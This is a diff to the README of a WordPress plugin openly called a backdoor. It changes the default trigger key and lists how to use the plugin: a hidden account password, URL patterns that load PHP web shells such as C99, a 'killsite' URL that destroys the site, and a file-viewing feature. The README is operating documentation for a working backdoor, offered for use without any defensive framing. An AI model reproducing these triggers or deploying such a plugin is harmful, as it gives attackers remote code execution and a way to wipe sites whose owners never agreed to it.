@@ -1,4 +1,4 @@
-# Ghost Backdoor Wordpress Plugin
+# Ghost Backdoor WordPress Plugin
 
 **Contributors**:
 * [CLEANCODED](https://cleancoded.com/)
@@ -37,16 +37,16 @@ This plugin does the following:
     * Password: K6BJ8V4JE6NeJ6g
 
 * **What is the default key?**
-    * jds89f43qmpewqfiopsejaSDJF
+    * a9J4dquMy3Qw7dvwN4yMvVm68K
 
 * **How do I access the PHP shell?**
     * To access the PHP shell, for example, the default C99 shell on http://localhost.com, navigate to this url:    
-        * http://localhost.com/loadshell-c99-jds89f43qmpewqfiopsejaSDJF
+        * http://localhost.com/loadshell-c99-a9J4dquMy3Qw7dvwN4yMvVm68K
     * The pattern for this is `loadshell-(SHELLNAME)-(KEY)`.
 
 * **How do I use the killsite/killswitch feature?**
     * To kill the website, http://localhost.com for example, navigate to this url:
-        * http://localhost.com/killsite-jds89f43qmpewqfiopsejaSDJF
+        * http://localhost.com/killsite-a9J4dquMy3Qw7dvwN4yMvVm68K
     * The pattern for this is `loadshell-(SHELLNAME)-(KEY)`.
 
 * **How do I view site files using the displayfile feature?**
